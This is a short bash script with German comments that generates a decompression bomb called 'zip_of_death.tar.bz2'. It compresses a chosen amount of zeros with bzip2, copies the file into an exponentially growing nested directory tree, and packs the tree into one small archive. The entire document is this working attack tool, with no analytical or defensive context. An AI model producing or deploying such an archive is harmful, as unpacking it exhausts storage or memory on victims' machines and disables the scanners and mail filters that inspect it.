#!/bin/bash
# Setup
ZIP_BIN="/usr/bin/bzip2 --best"
ZIP_EXT="bz2"
BASE_DIR="/tmp"
STRUCT_DIR="archiv"
TMP_STRUCT_DIR="tmp_archiv"

# Parameter abfragen
echo -n "Größe für Einzeldatei mit Nullen [MByte]: "
read SIZE
echo -n "Verschachtelungstiefe: "
read DEPTH

# Arbeitsverzeichnis erstellen
cd $BASE_DIR

# Archiv it vieeeelen Nullen erzeugen
dd ibs=1M count=$SIZE if=/dev/zero | $ZIP_BIN | dd of="nullen.$ZIP_EXT"

# Verzeichnis erzeugen und Dateien kopieren
echo "Erzeuge komprimierte Datei mit $SIZE MByte binären Nullen..."
mkdir $STRUCT_DIR
for ((i=1;i<=$DEPTH;i++))
  do
    cp "nullen.$ZIP_EXT" $STRUCT_DIR/"nullen_$i.$ZIP_EXT"
  done

# und nun alles schön aufblasen
for ((j=1;j<=$DEPTH;j++))
  do
    echo "Erzeuge Ebene $j von $DEPTH..."
    mv $STRUCT_DIR $TMP_STRUCT_DIR
    mkdir $STRUCT_DIR
    for ((i=1;i<=$DEPTH;i++))
      do
        cp -R $TMP_STRUCT_DIR "$STRUCT_DIR/$i"
      done
    rm -rf $TMP_STRUCT_DIR
    done # Ende der äußeren Schleife

# nun noch in ein Archiv verpacken
echo "In Archiv packen und komprimieren..."
tar cf "zip_of_death.tar" $STRUCT_DIR
$ZIP_BIN "zip_of_death.tar"

# aufräumen
rm -rf $STRUCT_DIR
rm -rf $TMP_STRUCT_DIR
exit 0
